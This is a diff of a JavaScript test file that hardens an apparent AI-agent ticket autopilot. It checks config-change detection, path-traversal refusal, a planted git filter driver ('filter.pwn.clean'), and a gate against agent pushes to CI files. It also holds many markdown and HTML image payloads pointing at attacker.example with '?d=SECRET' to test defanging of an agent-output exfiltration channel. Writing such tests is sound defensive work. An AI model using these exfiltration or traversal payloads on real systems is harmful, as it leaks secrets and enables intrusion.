@@ -280,7 +280,7 @@ test('begin snapshots the config; later commands with the file unchanged pass', 
   const snap = JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8'));
   assert.deepEqual(snap.autopilot, readMarker(ws).autopilot);
   assert.deepEqual(snap.tickets, readMarker(ws).tickets);
-  // An unrelated key may change: only tickets and autopilot are guarded.
+  // An unrelated key may change: only the snapshot keys (tickets, autopilot, repos, topology, qa, kb) are guarded.
   writeMarker(ws, (m) => { m.somethingElse = 'changed'; });
   const status = run(ws, ['status', 'GH-16']);
   assert.equal(status.code, 0, status.stdout + status.stderr);
@@ -1022,4 +1022,284 @@ test('review: begin accepts the engine\'s next stage or a retry of the current o
   }
   assert.equal(run(ws, ['begin', 'GH-16', 'spec']).code, 0);
   assert.equal(run(ws, ['begin', 'GH-16', 'spec']).code, 0, 'a retry of the open stage');
+});
+
+// ---------------------------------------------------------------------------------------------
+// Round 3 (re-hunt of 386b837): Medium 13 and 15, the snapshot and the status command
+// ---------------------------------------------------------------------------------------------
+
+test('round3 Medium 13: a changed repos, topology or qa key is a config change, and `next` blocks the ticket on it', () => {
+  const ws = workspace({ nested: true, qa: true });
+  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
+  const original = fs.readFileSync(markerFile(ws), 'utf8');
+  const snap = JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8'));
+  for (const key of ['repos', 'topology', 'qa']) assert.ok(snap[key] !== undefined, `the snapshot holds ${key}`);
+  for (const [mutate, pattern] of [
+    [(m) => { m.repos[0].path = 'elsewhere'; }, /repos\[0\]\.path/],
+    [(m) => { m.topology = 'root'; }, /topology/],
+    [(m) => { m.qa.urls.frontend = 'http://attacker.example'; }, /qa\.urls\.frontend/],
+    [(m) => { delete m.qa; }, /\bqa\b/],
+  ]) {
+    writeMarker(ws, mutate);
+    const status = run(ws, ['status', 'GH-16']);
+    assert.equal(status.code, 0, status.stdout + status.stderr);
+    assert.match(status.json.configChange ?? '', pattern, status.stdout);
+    fs.writeFileSync(markerFile(ws), original);
+    assert.equal(run(ws, ['status', 'GH-16']).json.configChange, undefined, 'the file as it was: no change');
+  }
+  writeMarker(ws, (m) => { delete m.qa; });
+  const r = run(ws, ['next', 'GH-16']);
+  assert.equal(r.code, 2, r.stdout + r.stderr);
+  assert.equal(r.json.error.code, 'config-changed');
+  assert.match(r.json.error.message, /\bqa\b/);
+});
+
+test('round3 Medium 13: a repos[].path that is absolute or holds .. is refused with bad-repos; a path under the root is not', () => {
+  const ws = workspace({ nested: true });
+  const refused = ['..', '../outside', 'a/../../b', 'a\\..\\b', '/etc', path.join(os.tmpdir(), 'elsewhere'), 'C:\\Users\\x', '\\\\server\\share\\r'];
+  for (const bad of refused) {
+    writeMarker(ws, (m) => { m.repos[0].path = bad; });
+    const r = run(ws, ['status', 'GH-16']);
+    assert.equal(r.json?.error?.code, 'bad-repos', `${bad}: ${r.stdout}${r.stderr}`);
+    assert.match(r.json.error.message, /repos\[backend\]\.path/);
+  }
+  for (const good of ['backend', 'apps/web', 'a..b', '.']) {
+    writeMarker(ws, (m) => { m.repos[0].path = good; });
+    const r = run(ws, ['status', 'GH-16']);
+    assert.equal(r.code, 0, `${good}: ${r.stdout}${r.stderr}`);
+  }
+  // No path: the engine falls back to the name, which is held to the same rule.
+  writeMarker(ws, (m) => { delete m.repos[0].path; m.repos[0].name = '../x'; });
+  assert.equal(run(ws, ['status', 'GH-16']).json?.error?.code, 'bad-repos');
+});
+
+test('round3 Medium 13: a ticket keeps the repositories it began with; a path a stage writes later is a config change, and accepting it with begin is refused while it leaves the project', () => {
+  const ws = workspace({ nested: true });
+  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
+  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
+  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
+  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
+  writeMarker(ws, (m) => { m.repos[0].path = '../outside'; });
+  const status = run(ws, ['status', 'GH-16']);
+  assert.equal(status.code, 0, status.stdout + status.stderr);
+  assert.match(status.json.configChange, /repos\[0\]\.path/, 'the snapshot repos are used; the live path is only a difference');
+  assert.equal(run(ws, ['next', 'GH-16']).json.error.code, 'config-changed');
+  const again = run(ws, ['begin', 'GH-16', 'spec']);
+  assert.equal(again.json?.error?.code, 'bad-repos', again.stdout + again.stderr);
+  assert.equal(JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8')).repos[0].path, 'backend', 'the refused path was not taken as the new baseline');
+  writeMarker(ws, (m) => { m.repos[0].path = 'backend'; });
+  assert.equal(run(ws, ['begin', 'GH-16', 'spec']).code, 0, 'with the path back, begin goes on');
+});
+
+test('round3 Medium 15: status compares the git config too, reports a changed watched key, and runs no git that checks out', () => {
+  const ws = workspace();
+  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
+  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
+  const ticketBranch = git(ws.root, 'branch', '--show-current');
+  assert.match(ticketBranch, /^GH-16-/);
+  // Control: with nothing changed, status still puts the documents repository on the ticket's branch.
+  git(ws.root, 'checkout', '-q', 'main');
+  const calm = run(ws, ['status', 'GH-16']);
+  assert.equal(calm.code, 0, calm.stdout + calm.stderr);
+  assert.equal(calm.json.gitConfigChange, undefined);
+  assert.equal(git(ws.root, 'branch', '--show-current'), ticketBranch);
+  // A filter driver planted in .git/config: status reports it and leaves the work tree alone.
+  git(ws.root, 'checkout', '-q', 'main');
+  git(ws.root, 'config', 'filter.pwn.clean', 'evil-program');
+  const planted = run(ws, ['status', 'GH-16']);
+  assert.equal(planted.code, 0, planted.stdout + planted.stderr);
+  assert.match(planted.json.gitConfigChange, /filter\.pwn\.clean/);
+  assert.match(planted.json.gitConfigChange, /blocked|run begin again/);
+  assert.equal(git(ws.root, 'branch', '--show-current'), 'main', 'status did not check out the ticket branch');
+});
+
+// ---------------------------------------------------------------------------------------------
+// Round 3, Medium 21: a remote image in agent-written markdown is an egress channel
+// ---------------------------------------------------------------------------------------------
+
+test('round3 Medium 21: defangRemoteImages turns a remote markdown or HTML image into a link text and leaves the rest alone', () => {
+  const d = lib.defangRemoteImages;
+  assert.equal(d('![shot](https://attacker.example/p.png?d=SECRET)'), '[image: shot](<https://attacker.example/p.png?d=SECRET>)');
+  assert.equal(d('![](http://attacker.example/p.png)'), '[image](<http://attacker.example/p.png>)');
+  assert.equal(d('before ![a b](<https://x.example/a b.png> "title") after'), 'before [image: a b](<https://x.example/a%20b.png>) after');
+  assert.equal(d('![x](https://x.example/p_(1).png)'), '[image: x](<https://x.example/p_(1).png>)');
+  assert.equal(d('![x](//x.example/p.png)'), '[image: x](<//x.example/p.png>)');
+  assert.equal(d('![nested [brackets] here](https://x.example/p.png)'), '[image: nested brackets here](<https://x.example/p.png>)');
+  assert.equal(d('<img src="https://x.example/p.png" alt="the shot">'), '[image: the shot](<https://x.example/p.png>)');
+  assert.equal(d("<IMG ALT='a>b' SRC='HTTPS://x.example/p.png' width=5>"), '[image: a>b](<HTTPS://x.example/p.png>)');
+  assert.equal(d('<img src=https://x.example/p.png>'), '[image](<https://x.example/p.png>)');
+  assert.equal(d('<img srcset="https://x.example/a.png 1x, https://x.example/b.png 2x">'), '[image](<https://x.example/a.png>)');
+  assert.equal(d('<video src="https://x.example/v.mp4"></video>'), '[video](<https://x.example/v.mp4>)</video>');
+  // Reference-style images carry the URL in a definition; the image becomes a text link.
+  assert.equal(d('![alt][r]\n\n[r]: https://x.example/p.png'), '[image: alt][r]\n\n[r]: https://x.example/p.png');
+  assert.equal(d('![alt]'), '[image: alt]');
+  // A URL spelled with entities, backslash escapes or a tab in its scheme is still remote.
+  assert.equal(d('![x](h&#116;tps://x.example/p.png)'), '[image: x](<https://x.example/p.png>)');
+  assert.equal(d('![x](https&colon;//x.example/p.png)'), '[image: x](<https://x.example/p.png>)');
+  assert.equal(d('![x](https\\://x.example/p.png)'), '[image: x](<https://x.example/p.png>)');
+  assert.equal(d('<img src="ht\ttps://x.example/p.png">'), '[image](<https://x.example/p.png>)');
+  // Not remote: a relative path, a data URL, a link that is not an image, plain text, an empty input.
+  for (const keep of ['![shot](artifacts/a.png)', '![shot](/uploads/abc/a.png)', '![x](data:image/png;base64,AAAA)', '[a link](https://x.example/p.png)', '<https://x.example/p.png>', 'Hello! [see](x)', '<img src="artifacts/a.png">', '']) {
+    assert.equal(d(keep), keep, keep);
+  }
+  assert.equal(d(null), '');
+  assert.equal(d(d('![x](https://x.example/p.png) <img src="https://x.example/q.png">')), d('![x](https://x.example/p.png) <img src="https://x.example/q.png">'), 'idempotent');
+  // What it writes cannot be read back as an image.
+  assert.ok(!/!\[/.test(d('![a](https://x.example/p.png)![b][c]')));
+});
+
+// Verification of round 3, Medium 21: a renderer fetches more than <img>. A remote address in src, srcset,
+// poster, data or background on any tag, and the href of <link> and <base>, is written as a link text too.
+test('round3 Medium 21: defangRemoteImages also defangs a remote poster, input image, object data, link href, embed, background, iframe and srcset candidate, and leaves a link alone', () => {
+  const d = lib.defangRemoteImages;
+  assert.equal(d('<video poster="https://attacker.example/p.png?d=SECRET"></video>'), '[video](<https://attacker.example/p.png?d=SECRET>)</video>');
+  assert.equal(d('<input type="image" src="https://attacker.example/i.png?d=SECRET" alt="go">'), '[input: go](<https://attacker.example/i.png?d=SECRET>)');
+  assert.equal(d('<object data="https://attacker.example/o.svg?d=SECRET"></object>'), '[object](<https://attacker.example/o.svg?d=SECRET>)</object>');
+  assert.equal(d('<link rel="stylesheet" href="https://attacker.example/s.css?d=SECRET">'), '[link](<https://attacker.example/s.css?d=SECRET>)');
+  assert.equal(d('<LINK REL=icon HREF=//attacker.example/f.ico>'), '[link](<//attacker.example/f.ico>)');
+  assert.equal(d('<embed src=https://attacker.example/e.svg?d=SECRET>'), '[embed](<https://attacker.example/e.svg?d=SECRET>)');
+  assert.equal(d('<table background="https://attacker.example/b.png?d=SECRET"><tr>'), '[table](<https://attacker.example/b.png?d=SECRET>)<tr>');
+  assert.equal(d('<div BACKGROUND=//attacker.example/b.png>x</div>'), '[div](<//attacker.example/b.png>)x</div>');
+  assert.equal(d('<iframe src="https://attacker.example/f?d=SECRET"></iframe>'), '[iframe](<https://attacker.example/f?d=SECRET>)</iframe>');
+  assert.equal(d('<base href="https://attacker.example/">'), '[base](<https://attacker.example/>)');
+  assert.equal(d('<video poster="h&#116;tps://attacker.example/p.png"></video>'), '[video](<https://attacker.example/p.png>)</video>');
+  assert.equal(d('<img/src="https://attacker.example/p.png">'), '[image](<https://attacker.example/p.png>)');
+  // A srcset names several candidates, and the first may be local.
+  assert.equal(d('<img srcset="a.png 1x, https://attacker.example/b.png?d=SECRET 2x">'), '[image](<https://attacker.example/b.png?d=SECRET>)');
+  // A link is a click, not a request the renderer makes on its own; a local or inline address is no egress.
+  for (const keep of [
+    '<a href="https://attacker.example/p.png">x</a>', '<a href="https://attacker.example/" title="data=https://attacker.example/">x</a>',
+    '<img alt="src=https://attacker.example/p.png" src="artifacts/p.png">', '<video poster="artifacts/p.png"></video>', '<input type="image" src="artifacts/i.png">',
+    '<link rel="stylesheet" href="artifacts/s.css">', '<object data="data:text/plain;base64,AAAA"></object>', '<base href="/docs/">', '<table background="images/b.png">',
+  ]) {
+    assert.equal(d(keep), keep, keep);
+  }
+  assert.equal(d(d('<video poster="https://attacker.example/p.png"></video><link href="https://attacker.example/s.css">')), d('<video poster="https://attacker.example/p.png"></video><link href="https://attacker.example/s.css">'), 'idempotent');
+});
+
+test('round3 Medium 21: a remote image in a blocked stage message reaches the ticket as a link text, not an image', () => {
+  const ws = workspace();
+  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
+  const message = 'Blocked. ![x](https://attacker.example/p.png?d=THE-DATA) and <img src="https://attacker.example/q.png?d=MORE">';
+  const r = run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: false, message })]);
+  assert.equal(r.code, 0, r.stdout + r.stderr);
+  const posted = callRecords(ws).filter((c) => c.args[0] === 'issue' && c.args[1] === 'comment').map((c) => c.stdin).join('\n');
+  assert.match(posted, /blocked at stage scaffold/);
+  assert.ok(posted.includes('[image: x](<https://attacker.example/p.png?d=THE-DATA>)'), posted);
+  assert.ok(posted.includes('[image](<https://attacker.example/q.png?d=MORE>)'), posted);
+  assert.ok(!/!\[x\]|<img/i.test(posted), posted);
+});
+
+// ---------------------------------------------------------------------------------------------
+// Round 3, Medium 22: the gate pushes the documents branch only when it holds documents
+// ---------------------------------------------------------------------------------------------
+
+const remoteHas = (ws, branch) => git(ws.root, 'ls-remote', '--heads', ws.origin, branch).trim() !== '';
+
+test('round3 Medium 22: the gate refuses to push a documents branch that changes a path outside the ticket folders, and blocks the stage with docs-scope', () => {
+  const ws = workspace();
+  throughPlan(ws);
+  const branch = git(ws.root, 'branch', '--show-current');
+  fs.mkdirSync(path.join(ws.root, '.circleci'), { recursive: true });
+  fs.writeFileSync(path.join(ws.root, '.circleci', 'config.yml'), 'version: 2.1\n');
+  fs.writeFileSync(path.join(ws.root, 'Jenkinsfile'), 'pipeline {}\n');
+  git(ws.root, 'add', '-A');
+  git(ws.root, 'commit', '-q', '-m', 'docs: a harmless note');
+  const r = run(ws, ['packet', 'GH-16']);
+  assert.equal(r.code, 2, r.stdout + r.stderr);
+  assert.equal(r.json.error.code, 'docs-scope');
+  assert.match(r.json.error.message, /\.circleci\/config\.yml/);
+  assert.match(r.json.error.message, /Jenkinsfile/);
+  assert.match(r.json.error.message, /tasks\/GH-16\//);
+  assert.ok(!remoteHas(ws, branch), 'nothing was pushed');
+  assert.equal(state(ws).stageStatus, 'blocked');
+  assert.equal(state(ws).stage, 'gate');
+  assert.ok(ws.calls().some((a) => a.includes('--add-label') && a.includes('up:blocked')), 'the ticket is labelled blocked');
+  const posted = callRecords(ws).filter((c) => c.args[0] === 'issue' && c.args[1] === 'comment').map((c) => c.stdin).join('\n');
+  assert.match(posted, /docs-scope/);
+  assert.ok(!/Packet id/i.test(posted), 'no packet was posted');
+});
+
+test('round3 Medium 22: another ticket\'s folder, a root file or a docs/ file counts as outside; the ticket\'s folders and the kb folders do not; a file added and removed again is clean', () => {
+  const ws = workspace();
+  throughPlan(ws);
+  const branch = git(ws.root, 'branch', '--show-current');
+  const commit = (message) => { git(ws.root, 'add', '-A'); git(ws.root, 'commit', '-q', '-m', message); };
+  const put = (file, text = 'text\n') => { fs.mkdirSync(path.dirname(path.join(ws.root, file)), { recursive: true }); fs.writeFileSync(path.join(ws.root, file), text); };
+  for (const file of ['specs/GH-17/Spec.md', 'README.md', 'docs/guide.md', 'src/app.js']) {
+    const before = fs.existsSync(path.join(ws.root, file)) ? fs.readFileSync(path.join(ws.root, file)) : null;
+    put(file, 'changed\n');
+    commit(`docs: ${file}`);
+    const r = run(ws, ['packet', 'GH-16']);
+    assert.equal(r.json?.error?.code, 'docs-scope', `${file}: ${r.stdout}${r.stderr}`);
+    assert.ok(r.json.error.message.includes(file), r.json.error.message);
+    assert.ok(!remoteHas(ws, branch), `${file}: nothing pushed`);
+    // Removing it again in a later commit leaves the branch holding documents only.
+    if (before) fs.writeFileSync(path.join(ws.root, file), before);
+    else git(ws.root, 'rm', '-q', '-f', file);
+    commit(`docs: take ${file} out again`);
+  }
+  assert.ok(readMarker(ws).kb.includes('handbooks'), 'the scaffold lists the knowledge-base folders');
+  for (const file of ['reviews/GH-16/notes.md', 'tasks/GH-16/attachments/a.txt', 'handbooks/Architecture.md', 'playbooks/Release.md']) put(file);
+  commit('docs: notes');
+  const ok = run(ws, ['packet', 'GH-16']);
+  assert.equal(ok.code, 0, ok.stdout + ok.stderr);
+  assert.ok(remoteHas(ws, branch), 'a branch of documents is pushed');
+});
+
+test('round3 Medium 22: pathsOutside lists what the branch changes outside the folders, compares against origin/<base> when it exists and the local base otherwise, and fails closed', () => {
+  const dir = tempRepo();
+  const allowed = ['tasks/X/', 'handbooks/'];
+  const put = (file, text) => { fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true }); fs.writeFileSync(path.join(dir, file), text); git(dir, 'add', '-A'); git(dir, 'commit', '-q', '-m', file); };
+  git(dir, 'checkout', '-q', '-b', 'feat');
+  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', allowed), [], 'no change at all');
+  put('tasks/X/a.md', '1\n');
+  put('handbooks/h.md', '1\n');
+  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', allowed), []);
+  put('.github/workflows/ci.yml', 'on: push\n');
+  put('a.txt', 'changed\n');
+  git(dir, 'mv', 'tasks/X/a.md', 'moved.md');
+  git(dir, 'commit', '-q', '-m', 'move');
+  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', allowed), ['.github/workflows/ci.yml', 'a.txt', 'moved.md']);
+  // The base moved on after the branch began: its changes are not the branch's.
+  git(dir, 'checkout', '-q', 'main');
+  put('upstream.txt', 'new on main\n');
+  git(dir, 'checkout', '-q', 'feat');
+  assert.ok(!repos.pathsOutside(dir, 'feat', 'main', allowed).includes('upstream.txt'));
+  // A local base behind origin/main, the branch begun on origin/main: only the branch's own paths.
+  const dir2 = tempRepo();
+  git(dir2, 'checkout', '-q', '-b', 'newer');
+  fs.writeFileSync(path.join(dir2, 'up.txt'), 'upstream\n');
+  git(dir2, 'add', '-A');
+  git(dir2, 'commit', '-q', '-m', 'upstream');
+  git(dir2, 'update-ref', 'refs/remotes/origin/main', git(dir2, 'rev-parse', 'HEAD'));
+  git(dir2, 'checkout', '-q', '-b', 'feat');
+  fs.mkdirSync(path.join(dir2, 'tasks', 'X'), { recursive: true });
+  fs.writeFileSync(path.join(dir2, 'tasks', 'X', 'a.md'), '1\n');
+  git(dir2, 'add', '-A');
+  git(dir2, 'commit', '-q', '-m', 'doc');
+  assert.deepEqual(repos.pathsOutside(dir2, 'feat', 'main', allowed), [], 'the upstream commit is origin/main\'s, not the branch\'s');
+  // Fails closed: no base, an option for a name, an unknown branch.
+  assert.equal(repos.pathsOutside(dir, 'feat', 'no-such-base', allowed), null);
+  assert.equal(repos.pathsOutside(dir, 'feat', '--output=x', allowed), null);
+  assert.equal(repos.pathsOutside(dir, '-x', 'main', allowed), null);
+  assert.equal(repos.pathsOutside(dir, 'no-such-branch', 'main', allowed), null);
+});
+
+// Verification of round 3, Medium 22: a stage can run `git checkout -B main HEAD`, which moves the local base
+// to the ticket branch's tip, so that the nearer of the two bases shows no change at all. The remote-tracking
+// base is the reference when there is one; the local base only when the repository has no such ref.
+test('round3 Medium 22: pathsOutside measures from the nearest base, so an unpushed base commit of the owner is not the ticket\'s change', () => {
+  const dir = tempRepo();
+  git(dir, 'update-ref', 'refs/remotes/origin/main', git(dir, 'rev-parse', 'HEAD'));
+  fs.writeFileSync(path.join(dir, 'LOCAL.md'), 'not pushed\n');
+  git(dir, 'add', '-A');
+  git(dir, 'commit', '-q', '-m', 'local: unpushed base commit');
+  git(dir, 'checkout', '-q', '-b', 'feat');
+  fs.mkdirSync(path.join(dir, 'tasks', 'X'), { recursive: true });
+  fs.writeFileSync(path.join(dir, 'tasks', 'X', 'a.md'), '1\n');
+  git(dir, 'add', '-A');
+  git(dir, 'commit', '-q', '-m', 'work');
+  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', ['tasks/X/']), [], 'LOCAL.md sits on the base, not on the ticket branch');
+  // A stage cannot move the base onto its tip: git checkout -B and git switch -C are refused in autopilot (the guardrail tests).
 });
